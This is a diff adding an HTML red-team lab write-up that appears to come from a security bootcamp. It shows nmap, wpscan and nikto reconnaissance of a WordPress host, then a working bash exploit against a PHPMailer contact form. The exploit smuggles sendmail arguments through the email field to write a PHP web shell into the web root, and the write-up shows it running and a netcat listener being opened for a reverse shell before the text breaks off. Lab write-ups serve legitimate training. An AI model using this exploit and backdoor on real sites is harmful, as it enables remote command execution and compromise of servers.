@@ -1,0 +1,233 @@
+<h1 id="red-team-summary-of-operations---target-2">Red Team: Summary of Operations - Target 2</h1>
+<h2 id="table-of-contents">Table of Contents</h2>
+<ul>
+<li>Recon</li>
+<li>Exploitation</li>
+</ul>
+<h2 id="recon">Recon</h2>
+<ul>
+<li>Nmap Service Version Scan</li>
+</ul>
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true"></a><span class="ex">root@Kali</span>:~# nmap -sV 192.168.1.115</span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true"></a><span class="ex">Starting</span> Nmap 7.80 ( https://nmap.org ) <span class="ex">at</span> 2022-03-20 10:34 PDT</span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true"></a><span class="ex">Nmap</span> scan report for 192.168.1.115</span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true"></a><span class="ex">Host</span> is up (0.00051s latency)<span class="ex">.</span></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true"></a><span class="ex">Not</span> shown: 995 closed ports</span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true"></a><span class="ex">PORT</span>    STATE SERVICE     VERSION</span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true"></a><span class="ex">22/tcp</span>  open  ssh         OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)</span>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true"></a><span class="ex">80/tcp</span>  open  http        Apache httpd 2.4.10 ((Debian))</span>
+<span id="cb1-9"><a href="#cb1-9" aria-hidden="true"></a><span class="ex">111/tcp</span> open  rpcbind     2-4 (RPC <span class="co">#100000)</span></span>
+<span id="cb1-10"><a href="#cb1-10" aria-hidden="true"></a><span class="ex">139/tcp</span> open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span>
+<span id="cb1-11"><a href="#cb1-11" aria-hidden="true"></a><span class="ex">445/tcp</span> open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span>
+<span id="cb1-12"><a href="#cb1-12" aria-hidden="true"></a><span class="ex">MAC</span> Address: 00:15:5D:00:04:11 (Microsoft)</span>
+<span id="cb1-13"><a href="#cb1-13" aria-hidden="true"></a><span class="ex">Service</span> Info: Host: TARGET2<span class="kw">;</span> <span class="ex">OS</span>: Linux<span class="kw">;</span> <span class="ex">CPE</span>: cpe:/o:linux:linux_kernel</span>
+<span id="cb1-14"><a href="#cb1-14" aria-hidden="true"></a></span>
+<span id="cb1-15"><a href="#cb1-15" aria-hidden="true"></a><span class="ex">Service</span> detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span id="cb1-16"><a href="#cb1-16" aria-hidden="true"></a><span class="ex">Nmap</span> done: 1 IP address (1 host up) <span class="ex">scanned</span> in 11.61 seconds</span></code></pre></div>
+<ul>
+<li>Nmap Vulnerability Scan</li>
+</ul>
+<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true"></a><span class="ex">root@Kali</span>:~# nmap --script vuln 192.168.1.115 -p 80</span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true"></a><span class="ex">Starting</span> Nmap 7.80 ( https://nmap.org ) <span class="ex">at</span> 2022-03-20 10:31 PDT</span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true"></a><span class="ex">Nmap</span> scan report for 192.168.1.115</span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true"></a><span class="ex">Host</span> is up (0.00063s latency)<span class="ex">.</span></span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true"></a></span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true"></a><span class="ex">PORT</span>   STATE SERVICE</span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true"></a><span class="ex">80/tcp</span> open  http</span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_clamav-exec</span>: ERROR: Script execution failed (use -d to debug)</span>
+<span id="cb2-9"><a href="#cb2-9" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">http-csrf</span>:</span>
+<span id="cb2-10"><a href="#cb2-10" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">Spidering</span> limited to: maxdepth=3<span class="kw">;</span> <span class="va">maxpagecount=</span>20; <span class="va">withinhost=</span>192.168.1.115</span>
+<span id="cb2-11"><a href="#cb2-11" aria-hidden="true"></a><span class="kw">|</span>   <span class="ex">Found</span> the following possible CSRF vulnerabilities:</span>
+<span id="cb2-12"><a href="#cb2-12" aria-hidden="true"></a><span class="kw">|</span></span>
+<span id="cb2-13"><a href="#cb2-13" aria-hidden="true"></a><span class="kw">|</span>     <span class="ex">Path</span>: http://192.168.1.115:80/</span>
+<span id="cb2-14"><a href="#cb2-14" aria-hidden="true"></a><span class="kw">|</span>     <span class="ex">Form</span> id:</span>
+<span id="cb2-15"><a href="#cb2-15" aria-hidden="true"></a><span class="kw">|</span>     <span class="ex">Form</span> action: https://spondonit.us12.list-manage.com/subscribe/post?u=1462626880ade1ac87bd9c93a<span class="kw">&amp;</span><span class="va">id=</span>92a4423d01</span>
+<span id="cb2-16"><a href="#cb2-16" aria-hidden="true"></a><span class="kw">|</span></span>
+<span id="cb2-17"><a href="#cb2-17" aria-hidden="true"></a><span class="kw">|</span>     <span class="ex">Path</span>: http://192.168.1.115:80/index.html</span>
+<span id="cb2-18"><a href="#cb2-18" aria-hidden="true"></a><span class="kw">|</span>     <span class="ex">Form</span> id:</span>
+<span id="cb2-19"><a href="#cb2-19" aria-hidden="true"></a><span class="kw">|</span>     <span class="ex">Form</span> action: https://spondonit.us12.list-manage.com/subscribe/post?u=1462626880ade1ac87bd9c93a<span class="kw">&amp;</span><span class="va">id=</span>92a4423d01</span>
+<span id="cb2-20"><a href="#cb2-20" aria-hidden="true"></a><span class="kw">|</span></span>
+<span id="cb2-21"><a href="#cb2-21" aria-hidden="true"></a><span class="kw">|</span>     <span class="ex">Path</span>: http://192.168.1.115:80/wordpress/</span>
+<span id="cb2-22"><a href="#cb2-22" aria-hidden="true"></a><span class="kw">|</span>     <span class="ex">Form</span> id: search-form-623764eb55e2b</span>
+<span id="cb2-23"><a href="#cb2-23" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_</span>    Form action: http://raven.local/wordpress/</span>
+<span id="cb2-24"><a href="#cb2-24" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_http-dombased-xss</span>: Couldnt find any DOM based XSS.</span>
+<span id="cb2-25"><a href="#cb2-25" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">http-enum</span>:</span>
+<span id="cb2-26"><a href="#cb2-26" aria-hidden="true"></a><span class="kw">|</span>   <span class="ex">/wordpress</span>/: <span class="ex">Blog</span></span>
+<span id="cb2-27"><a href="#cb2-27" aria-hidden="true"></a><span class="kw">|</span>   <span class="ex">/wordpress</span>/wp-login.php: <span class="ex">Wordpress</span> login page.</span>
+<span id="cb2-28"><a href="#cb2-28" aria-hidden="true"></a><span class="kw">|</span>   <span class="ex">/css</span>/: <span class="ex">Potentially</span> interesting directory w/ listing on apache/2.4.10 (debian)</span>
+<span id="cb2-29"><a href="#cb2-29" aria-hidden="true"></a><span class="kw">|</span>   <span class="ex">/img</span>/: <span class="ex">Potentially</span> interesting directory w/ listing on apache/2.4.10 (debian)</span>
+<span id="cb2-30"><a href="#cb2-30" aria-hidden="true"></a><span class="kw">|</span>   <span class="ex">/js</span>/: <span class="ex">Potentially</span> interesting directory w/ listing on apache/2.4.10 (debian)</span>
+<span id="cb2-31"><a href="#cb2-31" aria-hidden="true"></a><span class="kw">|</span>   <span class="ex">/manual</span>/: <span class="ex">Potentially</span> interesting folder</span>
+<span id="cb2-32"><a href="#cb2-32" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_</span>  /vendor/: Potentially interesting directory w/ listing on apache/2.4.10 (debian)</span>
+<span id="cb2-33"><a href="#cb2-33" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_http-stored-xss</span>: Couldnt find any stored XSS vulnerabilities.</span>
+<span id="cb2-34"><a href="#cb2-34" aria-hidden="true"></a><span class="ex">MAC</span> Address: 00:15:5D:00:04:11 (Microsoft)</span>
+<span id="cb2-35"><a href="#cb2-35" aria-hidden="true"></a></span>
+<span id="cb2-36"><a href="#cb2-36" aria-hidden="true"></a><span class="ex">Nmap</span> done: 1 IP address (1 host up) <span class="ex">scanned</span> in 31.91 seconds</span></code></pre></div>
+<ul>
+<li>WPscan</li>
+</ul>
+<div class="sourceCode" id="cb3"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true"></a><span class="ex">root@Kali</span>:~# wpscan --url 192.168.1.115/wordpress -e u</span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true"></a><span class="ex">_______________________________________________________________</span></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true"></a>         <span class="ex">__</span>          _______   _____</span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true"></a>         <span class="ex">\ \ </span>       / /  __ <span class="dt">\ </span>/ ____<span class="kw">|</span></span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true"></a>          <span class="ex">\ \ </span> /\  / /<span class="kw">|</span> <span class="kw">|</span><span class="ex">__</span>) <span class="kw">|</span> <span class="kw">(</span><span class="ex">___</span>   ___  __ _ _ __ ®</span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true"></a>           <span class="ex">\ </span>\/  \/ / <span class="kw">|</span>  <span class="ex">___/</span> \___ <span class="dt">\ </span>/ __<span class="kw">|</span><span class="ex">/</span> _  <span class="kw">|</span>  <span class="ex">_</span> <span class="kw">\</span></span>
+<span id="cb3-7"><a href="#cb3-7" aria-hidden="true"></a>            <span class="ex">\ </span> /\  /  <span class="kw">|</span> <span class="kw">|</span>     <span class="ex">____</span><span class="kw">)</span> <span class="kw">|</span> <span class="kw">(</span><span class="ex">__</span><span class="kw">|</span> <span class="kw">(</span><span class="ex">_</span><span class="kw">|</span> <span class="kw">|</span> <span class="kw">|</span> <span class="kw">|</span> <span class="kw">|</span></span>
+<span id="cb3-8"><a href="#cb3-8" aria-hidden="true"></a>             \<span class="ex">/</span>  \/   <span class="kw">|</span><span class="ex">_</span><span class="kw">|</span>    <span class="kw">|</span><span class="ex">_____/</span> \___<span class="kw">|</span>\<span class="ex">__</span>,_<span class="kw">|</span><span class="ex">_</span><span class="kw">|</span> <span class="kw">|</span><span class="ex">_</span><span class="kw">|</span></span>
+<span id="cb3-9"><a href="#cb3-9" aria-hidden="true"></a></span>
+<span id="cb3-10"><a href="#cb3-10" aria-hidden="true"></a>         <span class="ex">WordPress</span> Security Scanner by the WPScan Team</span>
+<span id="cb3-11"><a href="#cb3-11" aria-hidden="true"></a>                         <span class="ex">Version</span> 3.7.8</span>
+<span id="cb3-12"><a href="#cb3-12" aria-hidden="true"></a>       <span class="ex">Sponsored</span> by Automattic - https://automattic.com/</span>
+<span id="cb3-13"><a href="#cb3-13" aria-hidden="true"></a>       <span class="ex">@_WPScan_</span>, @ethicalhack3r, @erwan_lr, @firefart</span>
+<span id="cb3-14"><a href="#cb3-14" aria-hidden="true"></a><span class="ex">_______________________________________________________________</span></span>
+<span id="cb3-15"><a href="#cb3-15" aria-hidden="true"></a></span>
+<span id="cb3-16"><a href="#cb3-16" aria-hidden="true"></a>[<span class="ex">+</span>] URL: http://192.168.1.115/wordpress/</span>
+<span id="cb3-17"><a href="#cb3-17" aria-hidden="true"></a>[<span class="ex">+</span>] Started: Sun Mar 20 10:37:31 2022</span>
+<span id="cb3-18"><a href="#cb3-18" aria-hidden="true"></a></span>
+<span id="cb3-19"><a href="#cb3-19" aria-hidden="true"></a><span class="ex">Interesting</span> Finding(s<span class="kw">)</span><span class="bu">:</span></span>
+<span id="cb3-20"><a href="#cb3-20" aria-hidden="true"></a></span>
+<span id="cb3-21"><a href="#cb3-21" aria-hidden="true"></a>[<span class="ex">+</span>] http://192.168.1.115/wordpress/</span>
+<span id="cb3-22"><a href="#cb3-22" aria-hidden="true"></a> <span class="kw">|</span> <span class="ex">Interesting</span> Entry: Server: Apache/2.4.10 (Debian<span class="kw">)</span></span>
+<span id="cb3-23"><a href="#cb3-23" aria-hidden="true"></a> <span class="kw">|</span> <span class="ex">Found</span> By: Headers (Passive Detection)</span>
+<span id="cb3-24"><a href="#cb3-24" aria-hidden="true"></a> <span class="kw">|</span> <span class="ex">Confidence</span>: 100%</span>
+<span id="cb3-25"><a href="#cb3-25" aria-hidden="true"></a></span>
+<span id="cb3-26"><a href="#cb3-26" aria-hidden="true"></a>[<span class="ex">+</span>] http://192.168.1.115/wordpress/xmlrpc.php</span>
+<span id="cb3-27"><a href="#cb3-27" aria-hidden="true"></a> <span class="kw">|</span> <span class="ex">Found</span> By: Direct Access (Aggressive Detection)</span>
+<span id="cb3-28"><a href="#cb3-28" aria-hidden="true"></a> <span class="kw">|</span> <span class="ex">Confidence</span>: 100%</span>
+<span id="cb3-29"><a href="#cb3-29" aria-hidden="true"></a> <span class="kw">|</span> <span class="ex">References</span>:</span>
+<span id="cb3-30"><a href="#cb3-30" aria-hidden="true"></a> <span class="kw">|</span>  <span class="ex">-</span> http://codex.wordpress.org/XML-RPC_Pingback_API</span>
+<span id="cb3-31"><a href="#cb3-31" aria-hidden="true"></a> <span class="kw">|</span>  <span class="ex">-</span> https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</span>
+<span id="cb3-32"><a href="#cb3-32" aria-hidden="true"></a> <span class="kw">|</span>  <span class="ex">-</span> https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</span>
+<span id="cb3-33"><a href="#cb3-33" aria-hidden="true"></a> <span class="kw">|</span>  <span class="ex">-</span> https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</span>
+<span id="cb3-34"><a href="#cb3-34" aria-hidden="true"></a> <span class="kw">|</span>  <span class="ex">-</span> https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</span>
+<span id="cb3-35"><a href="#cb3-35" aria-hidden="true"></a></span>
+<span id="cb3-36"><a href="#cb3-36" aria-hidden="true"></a>[<span class="ex">+</span>] http://192.168.1.115/wordpress/readme.html</span>
+<span id="cb3-37"><a href="#cb3-37" aria-hidden="true"></a> <span class="kw">|</span> <span class="ex">Found</span> By: Direct Access (Aggressive Detection)</span>
+<span id="cb3-38"><a href="#cb3-38" aria-hidden="true"></a> <span class="kw">|</span> <span class="ex">Confidence</span>: 100%</span>
+<span id="cb3-39"><a href="#cb3-39" aria-hidden="true"></a></span>
+<span id="cb3-40"><a href="#cb3-40" aria-hidden="true"></a>[<span class="ex">+</span>] Upload directory has listing enabled: http://192.168.1.115/wordpress/wp-content/uploads/</span>
+<span id="cb3-41"><a href="#cb3-41" aria-hidden="true"></a> <span class="kw">|</span> <span class="ex">Found</span> By: Direct Access (Aggressive Detection)</span>
+<span id="cb3-42"><a href="#cb3-42" aria-hidden="true"></a> <span class="kw">|</span> <span class="ex">Confidence</span>: 100%</span>
+<span id="cb3-43"><a href="#cb3-43" aria-hidden="true"></a></span>
+<span id="cb3-44"><a href="#cb3-44" aria-hidden="true"></a>[<span class="ex">+</span>] http://192.168.1.115/wordpress/wp-cron.php</span>
+<span id="cb3-45"><a href="#cb3-45" aria-hidden="true"></a> <span class="kw">|</span> <span class="ex">Found</span> By: Direct Access (Aggressive Detection)</span>
+<span id="cb3-46"><a href="#cb3-46" aria-hidden="true"></a> <span class="kw">|</span> <span class="ex">Confidence</span>: 60%</span>
+<span id="cb3-47"><a href="#cb3-47" aria-hidden="true"></a> <span class="kw">|</span> <span class="ex">References</span>:</span>
+<span id="cb3-48"><a href="#cb3-48" aria-hidden="true"></a> <span class="kw">|</span>  <span class="ex">-</span> https://www.iplocation.net/defend-wordpress-from-ddos</span>
+<span id="cb3-49"><a href="#cb3-49" aria-hidden="true"></a> <span class="kw">|</span>  <span class="ex">-</span> https://github.com/wpscanteam/wpscan/issues/1299</span>
+<span id="cb3-50"><a href="#cb3-50" aria-hidden="true"></a></span>
+<span id="cb3-51"><a href="#cb3-51" aria-hidden="true"></a>[<span class="ex">+</span>] WordPress version 4.8.19 identified (Latest, released on 2022-03-11)<span class="ex">.</span></span>
+<span id="cb3-52"><a href="#cb3-52" aria-hidden="true"></a> <span class="kw">|</span> <span class="ex">Found</span> By: Emoji Settings (Passive Detection)</span>
+<span id="cb3-53"><a href="#cb3-53" aria-hidden="true"></a> <span class="kw">|</span>  <span class="ex">-</span> http://192.168.1.115/wordpress/, Match: <span class="st">&#39;-release.min.js?ver=4.8.19&#39;</span></span>
+<span id="cb3-54"><a href="#cb3-54" aria-hidden="true"></a> <span class="kw">|</span> <span class="ex">Confirmed</span> By: Meta Generator (Passive Detection)</span>
+<span id="cb3-55"><a href="#cb3-55" aria-hidden="true"></a> <span class="kw">|</span>  <span class="ex">-</span> http://192.168.1.115/wordpress/, Match: <span class="st">&#39;WordPress 4.8.19&#39;</span></span>
+<span id="cb3-56"><a href="#cb3-56" aria-hidden="true"></a></span>
+<span id="cb3-57"><a href="#cb3-57" aria-hidden="true"></a>[<span class="ex">i</span>] The main theme could not be detected.</span>
+<span id="cb3-58"><a href="#cb3-58" aria-hidden="true"></a></span>
+<span id="cb3-59"><a href="#cb3-59" aria-hidden="true"></a>[<span class="ex">+</span>] Enumerating Users (via Passive and Aggressive Methods)</span>
+<span id="cb3-60"><a href="#cb3-60" aria-hidden="true"></a> <span class="ex">Brute</span> Forcing Author IDs - Time: 00:00:00 <span class="op">&lt;</span>===============================================================<span class="op">&gt;</span> (10 / 10) <span class="ex">100.00%</span> Time: 00:00:00</span>
+<span id="cb3-61"><a href="#cb3-61" aria-hidden="true"></a></span>
+<span id="cb3-62"><a href="#cb3-62" aria-hidden="true"></a>[<span class="ex">i</span>] User(s) <span class="ex">Identified</span>:</span>
+<span id="cb3-63"><a href="#cb3-63" aria-hidden="true"></a></span>
+<span id="cb3-64"><a href="#cb3-64" aria-hidden="true"></a>[<span class="ex">+</span>] michael</span>
+<span id="cb3-65"><a href="#cb3-65" aria-hidden="true"></a> <span class="kw">|</span> <span class="ex">Found</span> By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span>
+<span id="cb3-66"><a href="#cb3-66" aria-hidden="true"></a> <span class="kw">|</span> <span class="ex">Confirmed</span> By: Login Error Messages (Aggressive Detection)</span>
+<span id="cb3-67"><a href="#cb3-67" aria-hidden="true"></a></span>
+<span id="cb3-68"><a href="#cb3-68" aria-hidden="true"></a>[<span class="ex">+</span>] steven</span>
+<span id="cb3-69"><a href="#cb3-69" aria-hidden="true"></a> <span class="kw">|</span> <span class="ex">Found</span> By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span>
+<span id="cb3-70"><a href="#cb3-70" aria-hidden="true"></a> <span class="kw">|</span> <span class="ex">Confirmed</span> By: Login Error Messages (Aggressive Detection)</span>
+<span id="cb3-71"><a href="#cb3-71" aria-hidden="true"></a></span>
+<span id="cb3-72"><a href="#cb3-72" aria-hidden="true"></a>[!] <span class="ex">No</span> WPVulnDB API Token given, as a result vulnerability data has not been output.</span>
+<span id="cb3-73"><a href="#cb3-73" aria-hidden="true"></a>[!] <span class="ex">You</span> can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up</span>
+<span id="cb3-74"><a href="#cb3-74" aria-hidden="true"></a></span>
+<span id="cb3-75"><a href="#cb3-75" aria-hidden="true"></a>[<span class="ex">+</span>] Finished: Sun Mar 20 10:37:34 2022</span>
+<span id="cb3-76"><a href="#cb3-76" aria-hidden="true"></a>[<span class="ex">+</span>] Requests Done: 48</span>
+<span id="cb3-77"><a href="#cb3-77" aria-hidden="true"></a>[<span class="ex">+</span>] Cached Requests: 4</span>
+<span id="cb3-78"><a href="#cb3-78" aria-hidden="true"></a>[<span class="ex">+</span>] Data Sent: 10.471 KB</span>
+<span id="cb3-79"><a href="#cb3-79" aria-hidden="true"></a>[<span class="ex">+</span>] Data Received: 285.51 KB</span>
+<span id="cb3-80"><a href="#cb3-80" aria-hidden="true"></a>[<span class="ex">+</span>] Memory used: 120.902 MB</span>
+<span id="cb3-81"><a href="#cb3-81" aria-hidden="true"></a>[<span class="ex">+</span>] Elapsed time: 00:00:02</span></code></pre></div>
+<ul>
+<li>Nikto Wordpress scan</li>
+</ul>
+<div class="sourceCode" id="cb4"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true"></a><span class="ex">root@Kali</span>:~# nikto -C all -h http://192.168.1.115/wordpress</span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true"></a><span class="ex">-</span> Nikto v2.1.6</span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true"></a><span class="ex">---------------------------------------------------------------------------</span></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true"></a><span class="ex">+</span> Target IP:          192.168.1.115</span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true"></a><span class="ex">+</span> Target Hostname:    192.168.1.115</span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true"></a><span class="ex">+</span> Target Port:        80</span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true"></a><span class="ex">+</span> Start Time:         2022-03-20 10:42:32 (GMT-7)</span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true"></a><span class="ex">---------------------------------------------------------------------------</span></span>
+<span id="cb4-9"><a href="#cb4-9" aria-hidden="true"></a><span class="ex">+</span> Server: Apache/2.4.10 (Debian)</span>
+<span id="cb4-10"><a href="#cb4-10" aria-hidden="true"></a><span class="ex">+</span> The anti-clickjacking X-Frame-Options header is not present.</span>
+<span id="cb4-11"><a href="#cb4-11" aria-hidden="true"></a><span class="ex">+</span> The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span>
+<span id="cb4-12"><a href="#cb4-12" aria-hidden="true"></a><span class="ex">+</span> Uncommon header <span class="st">&#39;link&#39;</span> found, with contents: <span class="op">&lt;</span>http://raven.local/wordpress/index.php/wp-json/<span class="op">&gt;</span><span class="kw">;</span> <span class="va">rel=</span><span class="st">&quot;https://api.w.org/&quot;</span></span>
+<span id="cb4-13"><a href="#cb4-13" aria-hidden="true"></a><span class="ex">+</span> The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span>
+<span id="cb4-14"><a href="#cb4-14" aria-hidden="true"></a><span class="ex">+</span> Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.37)<span class="bu">.</span> <span class="ex">Apache</span> 2.2.34 is the EOL for the 2.x branch.</span>
+<span id="cb4-15"><a href="#cb4-15" aria-hidden="true"></a><span class="ex">+</span> Allowed HTTP Methods: POST, OPTIONS, GET, HEAD</span>
+<span id="cb4-16"><a href="#cb4-16" aria-hidden="true"></a><span class="ex">+</span> Web Server returns a valid response with junk HTTP methods, this may cause false positives.</span>
+<span id="cb4-17"><a href="#cb4-17" aria-hidden="true"></a><span class="ex">+</span> DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.</span>
+<span id="cb4-18"><a href="#cb4-18" aria-hidden="true"></a><span class="ex">+</span> /wordpress/wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin <span class="st">&#39;Tested up to&#39;</span> version usually matches the WordPress version+ /wordpress/wp-links-opml.php: This WordPress script reveals the installed version.</span>
+<span id="cb4-19"><a href="#cb4-19" aria-hidden="true"></a><span class="ex">+</span> OSVDB-3092: /wordpress/license.txt: License file found may identify site software.</span>
+<span id="cb4-20"><a href="#cb4-20" aria-hidden="true"></a><span class="ex">+</span> /wordpress/: A Wordpress installation was found.</span>
+<span id="cb4-21"><a href="#cb4-21" aria-hidden="true"></a><span class="ex">+</span> Cookie wordpress_test_cookie created without the httponly flag</span>
+<span id="cb4-22"><a href="#cb4-22" aria-hidden="true"></a><span class="ex">+</span> OSVDB-3268: /wordpress/wp-content/uploads/: Directory indexing found.</span>
+<span id="cb4-23"><a href="#cb4-23" aria-hidden="true"></a><span class="ex">+</span> /wordpress/wp-content/uploads/: Wordpress uploads directory is browsable. This may reveal sensitive information</span>
+<span id="cb4-24"><a href="#cb4-24" aria-hidden="true"></a><span class="ex">+</span> /wordpress/wp-login.php: Wordpress login found</span>
+<span id="cb4-25"><a href="#cb4-25" aria-hidden="true"></a><span class="ex">+</span> 26522 requests: 0 error(s) <span class="ex">and</span> 16 item(s) <span class="ex">reported</span> on remote host</span>
+<span id="cb4-26"><a href="#cb4-26" aria-hidden="true"></a><span class="ex">+</span> End Time:           2022-03-20 10:44:26 (GMT-7) <span class="kw">(</span><span class="ex">114</span> seconds<span class="kw">)</span></span>
+<span id="cb4-27"><a href="#cb4-27" aria-hidden="true"></a><span class="ex">---------------------------------------------------------------------------</span></span>
+<span id="cb4-28"><a href="#cb4-28" aria-hidden="true"></a><span class="ex">+</span> 1 host(s) <span class="ex">tested</span></span></code></pre></div>
+<h2 id="exploitation">Exploitation</h2>
+<ul>
+<li>exploit script</li>
+</ul>
+<div class="sourceCode" id="cb5"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true"></a><span class="co">#!/bin/bash</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true"></a><span class="co"># Lovingly borrowed from: https://github.com/coding-boot-camp/cybersecurity-v2/new/master/1-Lesson-Plans/24-Final-Project/Activities/Day-1/Unsolved</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true"></a></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true"></a><span class="va">TARGET=</span>http://192.168.1.115/contact.php</span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true"></a></span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true"></a><span class="va">DOCROOT=</span>/var/www/html</span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true"></a><span class="va">FILENAME=</span>backdoor.php</span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true"></a><span class="va">LOCATION=$DOCROOT</span>/<span class="va">$FILENAME</span></span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true"></a></span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true"></a><span class="va">STATUS=$(</span><span class="ex">curl</span> -s <span class="kw">\</span></span>
+<span id="cb5-11"><a href="#cb5-11" aria-hidden="true"></a>              <span class="ex">--data-urlencode</span> <span class="st">&quot;name=Hackerman&quot;</span> <span class="kw">\</span></span>
+<span id="cb5-12"><a href="#cb5-12" aria-hidden="true"></a>              <span class="ex">--data-urlencode</span> <span class="st">&quot;email=</span><span class="dt">\&quot;</span><span class="st">hackerman</span><span class="dt">\\\&quot;</span><span class="st"> -oQ/tmp -X</span><span class="va">$LOCATION</span><span class="st"> blah</span><span class="dt">\&quot;</span><span class="st">@badguy.com&quot;</span> <span class="kw">\</span></span>
+<span id="cb5-13"><a href="#cb5-13" aria-hidden="true"></a>              <span class="ex">--data-urlencode</span> <span class="st">&quot;message=&lt;?php echo shell_exec(</span><span class="dt">\$</span><span class="st">_GET[&#39;cmd&#39;]); ?&gt;&quot;</span> <span class="kw">\</span></span>
+<span id="cb5-14"><a href="#cb5-14" aria-hidden="true"></a>              <span class="ex">--data-urlencode</span> <span class="st">&quot;action=submit&quot;</span> <span class="kw">\</span></span>
+<span id="cb5-15"><a href="#cb5-15" aria-hidden="true"></a>              <span class="va">$TARGET</span> <span class="kw">|</span> <span class="fu">sed</span> -r <span class="st">&#39;146!d&#39;</span><span class="va">)</span></span>
+<span id="cb5-16"><a href="#cb5-16" aria-hidden="true"></a></span>
+<span id="cb5-17"><a href="#cb5-17" aria-hidden="true"></a><span class="kw">if</span> <span class="fu">grep</span> <span class="st">&#39;instantiate&#39;</span> <span class="op">&amp;&gt;</span>/dev/null <span class="op">&lt;&lt;&lt;</span><span class="st">&quot;</span><span class="va">$STATUS</span><span class="st">&quot;</span><span class="kw">;</span> <span class="kw">then</span></span>
+<span id="cb5-18"><a href="#cb5-18" aria-hidden="true"></a>  <span class="bu">echo</span> <span class="st">&quot;[+] Check </span><span class="va">${LOCATION}</span><span class="st">?cmd=[shell command, e.g. id]&quot;</span></span>
+<span id="cb5-19"><a href="#cb5-19" aria-hidden="true"></a><span class="kw">else</span></span>
+<span id="cb5-20"><a href="#cb5-20" aria-hidden="true"></a>  <span class="bu">echo</span> <span class="st">&quot;[!] Exploit failed&quot;</span></span>
+<span id="cb5-21"><a href="#cb5-21" aria-hidden="true"></a><span class="kw">fi</span></span></code></pre></div>
+<ul>
+<li>exploit script excecuted</li>
+</ul>
+<div class="sourceCode" id="cb6"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true"></a><span class="ex">root@Kali</span>:~# ./exploit.sh</span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true"></a>[<span class="ex">+</span>] Check /var/www/html/backdoor.php?cmd=[shell command, e.g. id]</span></code></pre></div>
+<ul>
+<li>Listener and reverse shell</li>
+</ul>
+<div class="sourceCode" id="cb7"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true"></a><span class="ex">root@Kali</span>:~# nc -lnvp 4444</span>
